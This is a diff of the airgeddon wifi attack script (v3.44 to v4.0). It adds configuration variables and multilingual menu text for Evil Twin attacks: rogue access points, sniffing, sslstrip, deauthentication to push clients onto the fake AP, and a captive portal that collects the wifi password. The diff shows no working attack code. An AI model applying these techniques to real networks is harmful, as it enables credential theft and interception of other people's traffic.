@@ -1,6 +1,6 @@
 #!/bin/bash
 
-airgeddon_version="3.44"
+airgeddon_version="4.0"
 
 #Enabled 1 / Disabled 0 - Debug mode for faster development skipping intro and initial checks - Default value 0
 debug_mode=0
@@ -30,7 +30,7 @@ script_filename="airgeddon.sh"
 urlgithub="https://github.com/$github_user/$github_repository"
 urlscript_directlink="https://raw.githubusercontent.com/$github_user/$github_repository/$branch/$script_filename"
 host_to_check_internet="github.com"
-mail="v1s1t0r.1sh3r3@gmail.com"
+mail="v1s1t0r.1s.h3r3@gmail.com"
 author="v1s1t0r"
 
 #Tools vars
@@ -49,6 +49,9 @@ optional_tools_names=(
 						"aireplay-ng"
 						"mdk3"
 						"hashcat"
+						"hostapd"
+						"dhcpd"
+						"iptables"
 					)
 declare -A optional_tools=(
 							[${optional_tools_names[0]}]=0
@@ -56,13 +59,15 @@ declare -A optional_tools=(
 							[${optional_tools_names[2]}]=0
 							[${optional_tools_names[3]}]=0
 							[${optional_tools_names[4]}]=0
+							[${optional_tools_names[5]}]=0
+							[${optional_tools_names[6]}]=0
+							[${optional_tools_names[7]}]=0
 						)
 update_tools=("curl")
 
 #General vars
 standardhandshake_filename="handshake-01.cap"
 tmpdir="/tmp/"
-tmpfiles_toclean=0
 osversionfile_dir="/etc/"
 minimum_bash_version_required="4.0"
 resume_message=224
@@ -70,6 +75,30 @@ abort_question=12
 pending_of_translation="[PoT]"
 escaped_pending_of_translation="\[PoT\]"
 standard_resolution="1024x768"
+
+#Dhcpd and Hostapd vars
+ip_range="192.168.1.0"
+alt_ip_range="172.16.250.0"
+router_ip="192.168.1.1"
+alt_router_ip="172.16.250.1"
+broadcast_ip="192.168.1.255"
+alt_broadcast_ip="172.16.250.255"
+range_start="192.168.1.33"
+range_stop="192.168.1.100"
+alt_range_start="172.16.250.33"
+alt_range_stop="172.16.250.100"
+std_c_mask="255.255.255.0"
+ip_mask="255.255.255.255"
+dhcpd_file="ag.dhcpd.conf"
+dns1="8.8.8.8"
+dns2="8.8.4.4"
+hostapd_file="ag.hostapd.conf"
+control_file="ag.control.sh"
+possible_dhcp_leases_files=(
+							"/var/lib/dhcp/dhcpd.leases"
+							"/var/state/dhcp/dhcpd.leases"
+							"/var/lib/dhcpd/dhcpd.leases"
+						)
 
 #Distros vars
 known_compatible_distros=(
@@ -98,6 +127,8 @@ declare handshake_attack_hints=(142)
 declare decrypt_hints=(171 178 179 208 244)
 declare select_interface_hints=(246)
 declare language_hints=(250)
+declare evil_twin_hints=(254 258 264 269 286)
+declare evil_twin_dos_hints=(267 268)
 
 #Charset vars
 crunch_lowercasecharset="abcdefghijklmnopqrstuvwxyz"
@@ -143,6 +174,63 @@ function language_strings() {
 	optionaltool_needed["catalan"]="Opció bloquejada, necessita: "
 	optionaltool_needed["portuguese"]="Opção bloqueado requer :"
 
+	declare -A under_construction
+	under_construction["english"]="under construction"
+	under_construction["spanish"]="en construcción"
+	under_construction["french"]="en construction"
+	under_construction["catalan"]="en construcció"
+	under_construction["portuguese"]="em construção"
+	under_constructionvar="${under_construction["$language"]}"
+
+	declare -gA control_window_texts
+	control_window_texts["english",0]="Evil Twin AP Info"
+	control_window_texts["spanish",0]="Info Evil Twin AP"
+	control_window_texts["french",0]="Info Evil Twin AP"
+	control_window_texts["catalan",0]="Info Evil Twin AP"
+	control_window_texts["portuguese",0]="Info Evil Twin AP"
+
+	control_window_texts["english",1]="Channel"
+	control_window_texts["spanish",1]="Canal"
+	control_window_texts["french",1]="Canal"
+	control_window_texts["catalan",1]="Canal"
+	control_window_texts["portuguese",1]="Canal"
+
+	control_window_texts["english",2]="Online time"
+	control_window_texts["spanish",2]="Tiempo online"
+	control_window_texts["french",2]="Temps en ligne"
+	control_window_texts["catalan",2]="Temps online"
+	control_window_texts["portuguese",2]="Tempo online"
+
+	control_window_texts["english",3]="DHCP ips given to possible connected clients"
+	control_window_texts["spanish",3]="Ips entregadas por DHCP a posibles clientes conectados"
+	control_window_texts["french",3]="Ips attribuées à d'éventuels clients DHCP"
+	control_window_texts["catalan",3]="Ips lliurades per DHCP a possibles clients connectats"
+	control_window_texts["portuguese",3]="Ips entregues pelos clientes DHCP ligado ao possível"
+
+	control_window_texts["english",4]="With this attack you have to use an external sniffer to try to obtain client passwords connected to the network"
+	control_window_texts["spanish",4]="Con este ataque has de usar un sniffer externo para intentar obtener contraseñas de los clientes conectados a la red"
+	control_window_texts["french",4]="Avec cette attaque, vous devez utiliser un sniffeur pour tenter d'obtenir les mots de passe des clients connectés au réseau"
+	control_window_texts["catalan",4]="Amb aquest atac has d'utilitzar un sniffer extern per intentar obtenir contrasenyes dels clients connectats a la xarxa"
+	control_window_texts["portuguese",4]="Com este ataque você tem que usar um sniffer externa para tentar obter as senhas dos clientes conectados à rede"
+
+	control_window_texts["english",5]="With this attack, watch the sniffer's screen to see if a password appears"
+	control_window_texts["spanish",5]="Con este ataque, estate atento a la pantalla del sniffer para ver si aparece alguna contraseña"
+	control_window_texts["french",5]="Vérifiez pendant l'attaque dans la console du sniffeur si un mot de passe a été capturé"
+	control_window_texts["catalan",5]="Amb aquest atac, estigues atent a la pantalla de l'sniffer per veure si apareix alguna contrasenya"
+	control_window_texts["portuguese",5]="Com este ataque, cuidado com a tela aparece sniffer para ver se uma senha"
+
+	control_window_texts["english",6]="With this attack, we'll wait for a network client to provide us with the password for the wifi network in our captive portal"
+	control_window_texts["spanish",6]="Con este ataque, esperaremos a que un cliente de la red nos provea de la contraseña de la red wifi en nuestro portal cautivo"
+	control_window_texts["french",6]="Avec cette attaque nous allons attendre qu'un client rentre le mot de passe du réseau cible dans notre portail captif"
+	control_window_texts["catalan",6]="Amb aquest atac, esperarem que un client de la xarxa ens proveeixi de la contrasenya de la xarxa wifi al nostre portal captiu"
+	control_window_texts["portuguese",6]="Com este ataque, vamos esperar por um cliente de rede nos fornecer a senha para a rede wifi no nosso portal cativo"
+
+	control_window_texts["english",7]="No clients connected yet"
+	control_window_texts["spanish",7]="No hay clientes conectados aún"
+	control_window_texts["french",7]="Toujours pas de clients connectés"
+	control_window_texts["catalan",7]="Encara no hi han clients connectats"
+	control_window_texts["portuguese",7]="Ainda não há clientes conectados"
+
 	declare -A arr
 	arr["english",0]="This interface $interface is already in managed mode"
 	arr["spanish",0]="Esta interfaz $interface ya está en modo managed"
@@ -176,9 +264,9 @@ function language_strings() {
 
 	arr["english",5]="It looks like your internet connection is unstable. The script can't connect to repository. It will continue without updating..."
 	arr["spanish",5]="Parece que tu conexión a internet no es estable. El script no puede conectar al repositorio. Continuará sin actualizarse..."
-	arr["french",5]="Votre connexion Internet est trop médiocre pour pouvoir se connecter aux dépôts comme ils se doit. Le script va s’exécuter sans s'actualiser..."
-	arr["catalan",5]="Sembla que la teva connexió a Internet no és estable. El script no pot connectar amb el repositori. Continuarà sense actualitzar-se..."
-	arr["portuguese",5]="$pending_of_translation Parece que sua conexão com a Internet não é estável. O script não pode conectar-se ao repositório. Ele continuará sem atualizar..."
+	arr["french",5]="Votre connexion internet est trop médiocre pour pouvoir se connecter aux dépôts comme ils se doit. Le script va s’exécuter sans s'actualiser..."
+	arr["catalan",5]="Sembla que la teva connexió a internet no és estable. El script no pot connectar amb el repositori. Continuarà sense actualitzar-se..."
+	arr["portuguese",5]="$pending_of_translation Parece que sua conexão com a internet não é estável. O script não pode conectar-se ao repositório. Ele continuará sem atualizar..."
 
 	arr["english",6]="Welcome to airgeddon script v$airgeddon_version"
 	arr["spanish",6]="Bienvenid@ a airgeddon script v$airgeddon_version"
@@ -300,11 +388,11 @@ function language_strings() {
 	arr["catalan",25]="Seleccioni un canal (1-14) :"
 	arr["portuguese",25]="$pending_of_translation Escolha um canal (1-14) :"
 
-	arr["english",26]="Channel set to $channel"
-	arr["spanish",26]="Canal elegido $channel"
-	arr["french",26]="Le canal $channel a été choisi"
-	arr["catalan",26]="El canal $channel s'ha escollit"
-	arr["portuguese",26]="$pending_of_translation Canal $channel selecionado"
+	arr["english",26]="Channel set to "${normal_color}"$channel"
+	arr["spanish",26]="Canal elegido "${normal_color}"$channel"
+	arr["french",26]="Le canal "${normal_color}"$channel"${blue_color}" a été choisi"
+	arr["catalan",26]="El canal "${normal_color}"$channel"${blue_color}" s'ha escollit"
+	arr["portuguese",26]="$pending_of_translation Canal "${normal_color}"$channel"${blue_color}" selecionado"
 
 	arr["english",27]="Type target BSSID (example: 00:11:22:33:44:55) :"
 	arr["spanish",27]="Escribe el BSSID objetivo (ejemplo: 00:11:22:33:44:55) :"
@@ -312,11 +400,11 @@ function language_strings() {
 	arr["catalan",27]="Escriu el BSSID objectiu (exemple: 00:11:22:33:44:55) :"
 	arr["portuguese",27]="$pending_of_translation Escreva o BSSID alvo (exemplo: 00:11:22:33:44:55) :"
 
-	arr["english",28]="BSSID set to $bssid"
-	arr["spanish",28]="BSSID elegido $bssid"
-	arr["french",28]="Le BSSID choisi est $bssid"
-	arr["catalan",28]="El BSSID escollit $bssid"
-	arr["portuguese",28]="$pending_of_translation BSSID escolhida $bssid"
+	arr["english",28]="BSSID set to "${normal_color}"$bssid"
+	arr["spanish",28]="BSSID elegido "${normal_color}"$bssid"
+	arr["french",28]="Le BSSID choisi est "${normal_color}"$bssid"
+	arr["catalan",28]="El BSSID escollit "${normal_color}"$bssid"
+	arr["portuguese",28]="$pending_of_translation BSSID escolhida "${normal_color}"$bssid"
 
 	arr["english",29]="Type target ESSID :"
 	arr["spanish",29]="Escribe el ESSID objetivo :"
@@ -330,11 +418,11 @@ function language_strings() {
 	arr["catalan",30]="Has seleccionat un ESSID de xarxa oculta. No es pot utilitzar. Selecciona un altre o executa un atac basat en BSSID en lloc d'aquest"
 	arr["portuguese",30]="$pending_of_translation Você selecionou uma rede ESSID oculto. Você não pode usar. Selecione outro ou executar um ataque com base BSSID ao invés desta"
 
-	arr["english",31]="ESSID set to $essid"
-	arr["spanish",31]="ESSID elegido $essid"
-	arr["french",31]="l'ESSID sélectionné est $essid"
-	arr["catalan",31]="l'ESSID seleccionat $essid"
-	arr["portuguese",31]="$pending_of_translation $essid ESSID escolhido"
+	arr["english",31]="ESSID set to "${normal_color}"$essid"
+	arr["spanish",31]="ESSID elegido "${normal_color}"$essid"
+	arr["french",31]="l'ESSID sélectionné est "${normal_color}"$essid"
+	arr["catalan",31]="l'ESSID seleccionat "${normal_color}"$essid"
+	arr["portuguese",31]="$pending_of_translation ESSID escolhido "${normal_color}"$essid"
 
 	arr["english",32]="All parameters set"
 	arr["spanish",32]="Todos los parámetros están listos"
@@ -505,16 +593,16 @@ function language_strings() {
 	arr["catalan",59]="11. Tornar al menú principal"
 	arr["portuguese",59]="$pending_of_translation 11. Volte ao menu principal"
 
-	arr["english",60]="7.  About & Credits"
-	arr["spanish",60]="7.  Acerca de & Créditos"
-	arr["french",60]="7.  A propos de & Crédits"
-	arr["catalan",60]="7.  Sobre & Crédits"
-	arr["portuguese",60]="$pending_of_translation 7.  Sobre & Créditos"
+	arr["english",60]="8.  About & Credits"
+	arr["spanish",60]="8.  Acerca de & Créditos"
+	arr["french",60]="8.  A propos de & Crédits"
+	arr["catalan",60]="8.  Sobre & Crédits"
+	arr["portuguese",60]="$pending_of_translation 8.  Sobre & Créditos"
 
-	arr["english",61]="9.  Exit script"
-	arr["spanish",61]="9.  Salir del script"
-	arr["french",61]="9.  Sortir du script"
-	arr["catalan",61]="9.  Sortir del script"
+	arr["english",61]="10. Exit script"
+	arr["spanish",61]="10. Salir del script"
+	arr["french",61]="10. Sortir du script"
+	arr["catalan",61]="10. Sortir del script"
 	arr["portuguese",61]="$pending_of_translation 9.  Saia do script"
 
 	arr["english",62]="8.  Beacon flood attack"
@@ -613,11 +701,11 @@ function language_strings() {
 	arr["catalan",77]="Interfície no vàlida"
 	arr["portuguese",77]="$pending_of_translation Interface inválida"
 
-	arr["english",78]="8.  Change language"
-	arr["spanish",78]="8.  Cambiar idioma"
-	arr["french",78]="8.  Changer de langue"
-	arr["catalan",78]="8.  Canviar l'idioma"
-	arr["portuguese",78]="$pending_of_translation 8.  Alterar idioma"
+	arr["english",78]="9.  Change language"
+	arr["spanish",78]="9.  Cambiar idioma"
+	arr["french",78]="9.  Changer de langue"
+	arr["catalan",78]="9.  Canviar l'idioma"
+	arr["portuguese",78]="$pending_of_translation 9.  Alterar idioma"
 
 	arr["english",79]="1.  English"
 	arr["spanish",79]="1.  Inglés"
@@ -1413,9 +1501,9 @@ function language_strings() {
 
 	arr["english",211]="It seems you have no internet access. The script can't connect to repository. It will continue without updating..."
 	arr["spanish",211]="Parece que no tienes conexión a internet. El script no puede conectar al repositorio. Continuará sin actualizarse..."
-	arr["french",211]="Il semble que vous ne pouvez pas vous connecter à Internet. Impossible dans ces conditions de pouvoir accéder aux dépôts. Le script va donc s’exécuter sans s'actualiser..."
+	arr["french",211]="Il semble que vous ne pouvez pas vous connecter à internet. Impossible dans ces conditions de pouvoir accéder aux dépôts. Le script va donc s’exécuter sans s'actualiser..."
 	arr["catalan",211]="Sembla que no tens connexió a internet. El script no pot connectar al repositori. Continuarà sense actualitzar-se..."
-	arr["portuguese",211]="$pending_of_translation Parece que você não tem acesso à Internet. O script não pode conectar-se ao repositório. Ele continuará sem atualizar..."
+	arr["portuguese",211]="$pending_of_translation Parece que você não tem acesso à internet. O script não pode conectar-se ao repositório. Ele continuará sem atualizar..."
 
 	arr["english",212]="The script is already in the latest version. It doesn't need to be updated"
 	arr["spanish",212]="El script ya está en la última versión. No necesita ser actualizado"
@@ -1657,17 +1745,293 @@ function language_strings() {
 	arr["catalan",251]="Has triat el mateix idioma que estava seleccionat. No es realitzaran canvis"
 	arr["portuguese",251]="$pending_of_translation Você escolheu o mesmo idioma que foi selecionado. Nenhuma alteração será feita"
 
+	arr["english",252]="7.  Evil Twin attacks menu"
+	arr["spanish",252]="7.  Menú de ataques Evil Twin"
+	arr["french",252]="7.  Menu des attaques Evil Twin"
+	arr["catalan",252]="7.  Menú d'atacs Evil Twin"
+	arr["portuguese",252]="$pending_of_translation 7.  Ataques Evil Twin menu"
+
+	arr["english",253]="Evil Twin attacks menu"
+	arr["spanish",253]="Menú de ataques Evil Twin"
+	arr["french",253]="Menu des attaques Evil Twin"
+	arr["catalan",253]="Menú d'atacs Evil Twin"
+	arr["portuguese",253]="$pending_of_translation Ataques Evil Twin menu"
+
+	arr["english",254]="In order to use the Evil Twin just AP and sniffing attacks, you must have another one interface in addition to the wifi network interface will become the AP, which will provide internet access to other clients on the network. This doesn't need to be wifi, can be ethernet"
+	arr["spanish",254]="Para utilizar los ataques de Evil Twin de solo AP y con sniffing, deberás tener además de la interfaz wifi que se transformará en el AP, otra interfaz de red con acceso a internet para proporcionar este servicio a otros clientes de la red. Esta no hace falta que sea wifi, puede ser ethernet"
+	arr["french",254]="Pour effectuer l'attaque Evil Twin combinant Rogue AP et capture des données vous avez besoin d'une interface réseau en plus de celle utilisée pour créer le point d'accès. Cette interface supplémentaire devra être connecté à l'Internet afin d'en proportionner l'accès aux clients du réseau. L'interface peut être une interface ethernet ou wifi"
+	arr["catalan",254]="Per utilitzar els atacs d'Evil Twin només amb AP i sniffing, hauràs de tenir a més de la interfície wifi que es transformarà en el AP, una altre interfície de xarxa amb accés a internet per proporcionar aquest servei a altres clients de la xarxa. Aquesta no cal que sigui wifi, pot ser ethernet"
+	arr["portuguese",254]="$pending_of_translation Para usar ataques Evil Twin única AP e sniffing, você deve ter além da interface wifi que se tornará a AP, uma outra interface de rede com acesso à internet para fornecer este serviço a outros clientes da rede. Isso não precisa ser wifi, pode ser ethernet"
+
+	arr["english",255]="without sniffing, just AP"
+	arr["spanish",255]="sin sniffing, solo AP"
+	arr["french",255]="rogue AP sans capture des données"
+	arr["catalan",255]="sense sniffing, només AP"
+	arr["portuguese",255]="$pending_of_translation sem sniffing, única AP"
+
+	arr["english",256]="5.  Evil Twin attack just AP"
+	arr["spanish",256]="5.  Ataque Evil Twin solo AP"
+	arr["french",256]="5.  Attaque Evil Twin Rogue AP simple"
+	arr["catalan",256]="5.  Atac Evil Twin només AP"
+	arr["portuguese",256]="$pending_of_translation 5.  Ataque Evil Twin só AP"
+
+	arr["english",257]="with sniffing"
+	arr["spanish",257]="con sniffing"
+	arr["french",257]="avec capture des données"
+	arr["catalan",257]="amb sniffing"
+	arr["portuguese",257]="$pending_of_translation com sniffing"
+
+	arr["english",258]="If you use the attack without sniffing, just AP, you'll can use any external to script sniffer software"
+	arr["spanish",258]="Si utilizas el ataque sin sniffing, solo AP, podrás usar cualquier programa sniffer externo al script"
+	arr["french",258]="Si vous lancez l'attaque sans capture des données (Rogue AP) vous pouvez utiliser un programme externe pour les capturer"
+	arr["catalan",258]="Si utilitzes l'atac sense sniffing, només AP, podràs fer servir qualsevol programa sniffer extern a l'script"
+	arr["portuguese",258]="$pending_of_translation Se você usar o ataque sem sniffing, apenas a AP, você pode usar qualquer programa sniffer externo ao script"
+
+	arr["english",259]="6.  Evil Twin AP attack with sniffing"
+	arr["spanish",259]="6.  Ataque Evil Twin AP con sniffing"
+	arr["french",259]="6.  Attaque Evil Twin avec Rogue AP et capture des données"
+	arr["catalan",259]="6.  Atac Evil Twin AP amb sniffing"
+	arr["portuguese",259]="$pending_of_translation 6.  Ataque Evil Twin AP com sniffing"
+
+	arr["english",260]="9.  Return to main menu"
+	arr["spanish",260]="9.  Volver al menú principal"
+	arr["french",260]="9.  Retourner au menu principal"
+	arr["catalan",260]="9.  Tornar al menú principal"
+	arr["portuguese",260]="$pending_of_translation 9.  Volte ao menu principal"
+
+	arr["english",261]="7.  Evil Twin AP attack with sniffing and sslstrip"
+	arr["spanish",261]="7.  Ataque Evil Twin AP con sniffing y sslstrip"
+	arr["french",261]="7.  Attaque Evil Twin avec capture des données et sslstrip"
+	arr["catalan",261]="7.  Atac Evil Twin AP amb sniffing i sslstrip"
+	arr["portuguese",261]="$pending_of_translation 7.  Ataque Evil Twin AP com sniffing e sslstrip"
+
+	arr["english",262]="without sniffing, captive portal"
+	arr["spanish",262]="sin sniffing, portal cautivo"
+	arr["french",262]="sans capture des données avec portail captif"
+	arr["catalan",262]="sense sniffing, portal captiu"
+	arr["portuguese",262]="$pending_of_translation sem sniffing, portal cativo"
+
+	arr["english",263]="8.  Evil Twin AP attack with captive portal"
+	arr["spanish",263]="8.  Ataque Evil Twin AP con portal cautivo"
+	arr["french",263]="8.  Attaque Evil Twin avec portail captif"
+	arr["catalan",263]="8.  Atac Evil Twin AP amb portal captiu"
+	arr["portuguese",263]="$pending_of_translation 8.  Ataque Evil Twin AP com portal cativo"
+
+	arr["english",264]="The captive portal attack tries to one of the network clients provide us the password for the wifi network by entering it on our portal"
+	arr["spanish",264]="El ataque del portal cautivo intentará conseguir que uno de los clientes de la red nos proporcione la contraseña de la red wifi introduciéndola en nuestro portal"
+	arr["french",264]="Le portail captif d'attaque tente d'obtenir l'un des clients du réseau nous fournir le mot de passe pour le réseau sans fil en entrant sur notre site"
+	arr["catalan",264]="L'atac de portal captiu intenta aconseguir que un dels clients de la xarxa ens proporcioni la contrasenya de la xarxa wifi introduint-la al nostre portal"
+	arr["portuguese",264]="$pending_of_translation O portal cativo ataque tenta fazer com que um dos clientes da rede nos fornecer a senha para a rede sem fio digitando-o em nosso site"
+
+	arr["english",265]="Evil Twin deauth"
+	arr["spanish",265]="Desautenticación para Evil Twin"
+	arr["french",265]="Dés-authentification pour Evil Twin"
+	arr["catalan",265]="Desautenticació per Evil Twin"
+	arr["portuguese",265]="$pending_of_translation Deauth para Evil Twin"
+
+	arr["english",266]="4.  Return to Evil Twin attacks menu"
+	arr["spanish",266]="4.  Volver al menú de ataques Evil Twin"
+	arr["french",266]="4.  Retour au menu d'attaques Evil Twin"
+	arr["catalan",266]="4.  Tornar al menú d'atacs Evil Twin"
+	arr["portuguese",266]="$pending_of_translation 4.  Voltar ao menu ataques Evil Twin"
+
+	arr["english",267]="If you can't deauth clients from an AP using an attack, choose another one :)"
+	arr["spanish",267]="Si no consigues desautenticar a los clientes de un AP con un ataque, elige otro :)"
+	arr["french",267]="Si vous ne pouvez pas dé-authentifier des clients avec une attaque, choisissez-en une autre :)"
+	arr["catalan",267]="Si no aconsegueixes desautenticar als clients d'un AP amb un atac, tria un altre :)"
+	arr["portuguese",267]="$pending_of_translation Se você não pode clientes de-autenticar um AP com um ataque, escolha outro :)"
+
+	arr["english",268]="With this attack, we'll try to deauth clients from the legitimate AP. Hopefully they'll reconnect to our Evil Twin AP"
+	arr["spanish",268]="Con este ataque, intentaremos desautenticar a los clientes del AP legítimo. Con suerte reconectarán pero a nuestro Evil Twin AP"
+	arr["french",268]="Avec cette attaque nous essayons de déconnecter des clients du point d'accès légitime en espérant qu'ils se connectent au notre Evil Twin AP"
+	arr["catalan",268]="Amb aquest atac, intentarem desautenticar als clients del AP legítim. Amb sort reconectarán però al nostre Evil Twin AP"
+	arr["portuguese",268]="$pending_of_translation Com este ataque, tentamos clientes de autenticação de legítima do AP. Esperemos que eles se reconectar mas o nosso Evil Twin AP"
+
+	arr["english",269]="To perform an Evil Twin attack you'll need to be very close to the target AP or have a very powerful wifi antenna. Your signal must reach clients equally strong or more than the legitimate AP"
+	arr["spanish",269]="Para realizar un ataque Evil Twin necesitarás estar muy cerca del AP objetivo o tener una antena wifi muy potente. Tu señal ha de llegar a los clientes igual de fuerte o más que la del AP legítimo"
+	arr["french",269]="Pour mener à bien une attaque Evil Twin il vous faut être dans de bonnes conditions d'émission et de réception tantôt avec le point d'accès qu'avec le(s) client(s)"
+	arr["catalan",269]="Per realitzar un atac Evil Twin et caldrà estar molt a prop de l'AP objectiu o tenir una antena wifi molt potent. El teu senyal ha d'arribar als clients igual de fort o més que la de l'AP legítim"
+	arr["portuguese",269]="$pending_of_translation Para fazer um ataque Evil Twin precisa estar perto da AP-alvo ou ter uma antena wifi muito poderosa. Seu sinal deve atingir os clientes igualmente forte ou mais do que o legítimo AP"
+
+	arr["english",270]="Evil Twin attack just AP"
+	arr["spanish",270]="Ataque Evil Twin solo AP"
+	arr["french",270]="Attaque Evil Twin Rogue AP simple"
+	arr["catalan",270]="Atac Evil Twin només AP"
+	arr["portuguese",270]="$pending_of_translation Ataque Evil Twin só AP"
+
+	arr["english",271]="Selected BSSID: "${pink_color}"None"${normal_color}
+	arr["spanish",271]="BSSID seleccionado: "${pink_color}"Ninguno"${normal_color}
+	arr["french",271]="BSSID sélectionné: "${pink_color}"Aucun"${normal_color}
+	arr["catalan",271]="BSSID seleccionat: "${pink_color}"Ningú"${normal_color}
+	arr["portuguese",271]="$pending_of_translation BSSID selecionado: "${pink_color}"Nenhum"${normal_color}
+
+	arr["english",272]="Deauthentication chosen method: "${pink_color}"$et_dos_attack"${normal_color}
+	arr["spanish",272]="Método elegido de desautenticación: "${pink_color}"$et_dos_attack"${normal_color}
+	arr["french",272]="Méthode de dés-authentification: "${pink_color}"$et_dos_attack"${normal_color}
+	arr["catalan",272]="Mètode elegit d'desautenticació: "${pink_color}"$et_dos_attack"${normal_color}
+	arr["portuguese",272]="$pending_of_translation Método escolhido deauth: "${pink_color}"$et_dos_attack"${normal_color}
+
+	arr["english",273]="Selected channel: "${pink_color}"None"${normal_color}
+	arr["spanish",273]="Canal seleccionado: "${pink_color}"Ninguno"${normal_color}
+	arr["french",273]="Canal sélectionné: "${pink_color}"Aucun"${normal_color}
+	arr["catalan",273]="Canal seleccionat: "${pink_color}"Ningú"${normal_color}
+	arr["portuguese",273]="$pending_of_translation Canal selecionado: "${pink_color}"Nenhum"${normal_color}
+
+	arr["english",274]="Selected ESSID: "${pink_color}"None"${normal_color}
+	arr["spanish",274]="ESSID seleccionado: "${pink_color}"Ninguno"${normal_color}
+	arr["french",274]="ESSID sélectionné: "${pink_color}"Aucun"${normal_color}
+	arr["catalan",274]="ESSID seleccionat: "${pink_color}"Ningú"${normal_color}
+	arr["portuguese",274]="$pending_of_translation ESSID selecionado: "${pink_color}"Nenhum"${normal_color}
+
+	arr["english",275]="In addition to the software requirements that already meet if you get here, you need to provide target AP data to carry out the attack"
+	arr["spanish",275]="Además de los requisitos de software, que ya cumples si has llegado hasta aquí, es necesario proporcionar los datos del AP objetivo para llevar a cabo el ataque"
+	arr["french",275]="Maintenant que les dépendances ont étés vérifiées il vous faut saisir les donnés sur le point d'accès cible"
+	arr["catalan",275]="A més dels requisits de software, que ja compleixes si has arribat fins aquí, cal proporcionar les dades de l'AP objectiu per dur a terme l'atac"
+	arr["portuguese",275]="$pending_of_translation Além dos requisitos de software que já se encontram, se você chegar aqui, você precisa fornecer dados objetivos AP para realizar o ataque"
+
+	arr["english",276]="On top of this screen you can see all that is needed to perform the attack. If any of the parameters has no value, you can enter it manually, or you can go back to select a target and then return here"
+	arr["spanish",276]="En la parte superior de esta pantalla puedes ver todo lo que hace falta para realizar el ataque. Si alguno de los parámetros no tiene valor, puedes introducirlo manualmente, o puedes retroceder para seleccionar un objetivo y regresar aquí"
+	arr["french",276]="Vous pouvez voir dans la partie supérieure de l'écran tout ce qui est nécessaire à l'attaque. Si l'un des paramètres est en blanc vous pouvez l'entrer manuellement ou bien vous pouvez revenir en arrière pour sélectionner une cible et revenir ici"
+	arr["catalan",276]="A la part superior d'aquesta pantalla pots veure tot el que cal per realitzar l'atac. Si algun dels paràmetres no té valor, pots introduir-lo manualment, o pots retrocedir per a seleccionar un objectiu i tornar aquí"
+	arr["portuguese",276]="$pending_of_translation No topo da tela você pode ver tudo o que é necessário para realizar o ataque. Se qualquer um dos parâmetros não tem nenhum valor, pode introduzi-lo manualmente, ou você pode voltar para selecionar um alvo e voltar aqui"
+
+	arr["english",277]="Do you want to continue? "${normal_color}"[y/n]"
+	arr["spanish",277]="¿Deseas continuar? "${normal_color}"[y/n]"
+	arr["french",277]="Voulez-vous continuer? "${normal_color}"[y/n]"
+	arr["catalan",277]="¿Vols continuar? "${normal_color}"[y/n]"
+	arr["portuguese",277]="$pending_of_translation Você deseja continuar? "${normal_color}"[y/n]"
+
+	arr["english",278]="Deauthentication chosen method: "${pink_color}"None"${normal_color}
+	arr["spanish",278]="Método elegido de desautenticación: "${pink_color}"Ninguno"${normal_color}
+	arr["french",278]="Méthode de dés-authentification: "${pink_color}"Aucun"${normal_color}
+	arr["catalan",278]="Mètode elegit d'desautenticació: "${pink_color}"Ningú"${normal_color}
+	arr["portuguese",278]="$pending_of_translation Método escolhido deauth: "${pink_color}"Nenhum"${normal_color}
+
+	arr["english",279]="Select another interface with internet access :"
+	arr["spanish",279]="Selecciona otra interfaz que tenga acceso a internet :"
+	arr["french",279]="Choisissez une autre interface qui ait accès à internet :"
+	arr["catalan",279]="Selecciona una altra interfície que tingui accés a internet :"
+	arr["portuguese",279]="$pending_of_translation Selecione outra interface que tem acesso à internet :"
+
+	arr["english",280]="On this screen, it's supposed an additional interface to provide internet access is chosen, but you don't have anyone at this moment"
+	arr["spanish",280]="En esta pantalla, se supone que deberías elegir otro interfaz adicional para proporcionar acceso a internet, pero no dispones de ninguno en este momento"
+	arr["french",280]="Sur cet écran vous êtes censé choisir une interface supplémentaire connectée à internet mais vous n'en avez pas en ce moment"
+	arr["catalan",280]="En aquesta pantalla, se suposa que hauries de triar un altre interfície addicional per a proporcionar accés a internet, però no disposes de cap en aquest moment"
+	arr["portuguese",280]="$pending_of_translation Nesta tela, você deveria escolher uma interface adicional para fornecer acesso à internet, mas não têm um neste momento"
+
+	arr["english",281]="The interface $interface you have already selected is not a wifi card. This attack needs a wifi card selected"
+	arr["spanish",281]="El interfaz $interface que tienes seleccionado no es una tarjeta wifi. Este ataque necesita que la interfaz seleccionada sea wifi"
+	arr["french",281]="L'interface $interface que vous avez sélectionnée n'est pas une carte wifi. Cette attaque exige que l'interface sélectionnée soit une carte wifi"
+	arr["catalan",281]="La interfície $interface que tens seleccionada no és una targeta wifi. Aquest atac necessita que la interfície seleccionada sigui wifi"
+	arr["portuguese",281]="$pending_of_translation A interface $interface que você selecionou não é um cartão de wifi. Este ataque requer que a interface selecionada é wifi"
+
+	arr["english",282]="Selected internet interface: "${pink_color}"$internet_interface"${normal_color}
+	arr["spanish",282]="Interfaz con internet seleccionada: "${pink_color}"$internet_interface"${normal_color}
+	arr["french",282]="Interface internet sélectionnée: "${pink_color}"$internet_interface"${normal_color}
+	arr["catalan",282]="Interfície amb internet seleccionada: "${pink_color}"$internet_interface"${normal_color}
+	arr["portuguese",282]="$pending_of_translation Interface da internet selecionado: "${pink_color}"$internet_interface"${normal_color}
+
+	arr["english",283]="Selected internet interface: "${pink_color}"None"${normal_color}
+	arr["spanish",283]="Interfaz con internet seleccionada: "${pink_color}"Ninguna"${normal_color}
+	arr["french",283]="Interface internet sélectionnée: "${pink_color}"Aucun"${normal_color}
+	arr["catalan",283]="Interfície amb internet seleccionat: "${pink_color}"Ningú"${normal_color}
+	arr["portuguese",283]="$pending_of_translation Interface da internet selecionado: "${pink_color}"Nenhum"${normal_color}
+
+	arr["english",284]="Do you want to use this selected interface? "${normal_color}"[y/n]"
+	arr["spanish",284]="¿Quieres utilizar esta interfaz ya seleccionada? "${normal_color}"[y/n]"
+	arr["french",284]="Souhaitez-vous utiliser l'interface déjà sélectionnée? "${normal_color}"[y/n]"
+	arr["catalan",284]="¿Vols fer servir aquesta interfície ja seleccionada? "${normal_color}"[y/n]"
+	arr["portuguese",284]="$pending_of_translation Você quer usar já estiver selecionada interface? "${normal_color}"[y/n]"
+
+	arr["english",285]="Selected interface with internet access detected during this session ["${normal_color}"$internet_interface"${blue_color}"]"
+	arr["spanish",285]="Se ha detectado que ya tiene un interfaz con acceso a internet seleccionada en esta sesión ["${normal_color}"$internet_interface"${blue_color}"]"
